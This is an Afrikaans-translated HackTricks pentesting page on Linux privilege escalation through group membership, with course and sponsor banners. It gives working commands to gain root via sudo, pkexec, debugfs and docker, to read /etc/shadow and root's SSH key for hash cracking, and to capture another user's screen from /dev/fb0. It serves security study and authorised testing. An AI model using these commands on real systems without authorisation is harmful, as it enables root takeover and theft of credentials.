{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groepe

## **PE - Metode 1**

**Soms**, **per standaard \(of omdat sommige sagteware dit benodig\)** binne die **/etc/sudoers** lêer kan jy sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```text
sudo su
```
## PE - Metode 2

Vind alle suid binaire en kyk of daar die binaire **Pkexec** is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binêre pkexec 'n SUID-binêre is en jy behoort tot sudo of admin, kan jy waarskynlik binêre uitvoer as sudo met behulp van pkexec. 
Kontroleer die inhoud van:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** kan sommige van die groepe **sudo of admin** in linux **verskyn**.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sessie2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```text
sudo su
```
# Shadow Group

Users from the **group shadow** can **read** the **/etc/shadow** file:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sommige hashes te kraak**.

# Skyf Groep

Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang het tot al die data binne die masjien.

Lêers:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Toegang geweier**" error.

# Video Groep

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingelogde** is op 'n terminal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rauwe beeld** te **open**, kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en kies as lêertipe **Raw image data**:

![](../../.gitbook/assets/image%20%28208%29.png)

Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en kyk na verskillende Beeldtipes \(en kies die een wat die skerm beter wys\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Groep

Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...

**Kontroleer watter lêers root lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Groep

Jy kan die wortel lêer stelsel van die gasheer masjien aan 'n instansie se volume monteer, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Groep

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
